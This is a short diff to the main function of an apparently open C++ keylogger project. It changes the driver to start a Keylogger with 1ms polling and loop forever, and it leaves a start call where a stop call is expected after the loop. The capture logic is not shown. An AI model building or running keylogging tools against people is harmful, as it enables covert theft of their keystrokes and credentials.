@@ -1,15 +1,13 @@
-#include <iostream>
-
 #include "keylogger.h"
 
 int main(int argc, char** argv) {
-	Keyboard keyboard{};
-	Keylogger* keylogger = keyboard.keylogger;
+	Keylogger keyboard(1ms);
 
-	keylogger->startKeylog();
+	keyboard.startKeylog();
+
 	while (true) {
-		;
+		std::this_thread::sleep_for(keyboard.polling);
 	}
-	keylogger->stopKeylog();
-	return 0;
+
+	keyboard.startKeylog();
 }
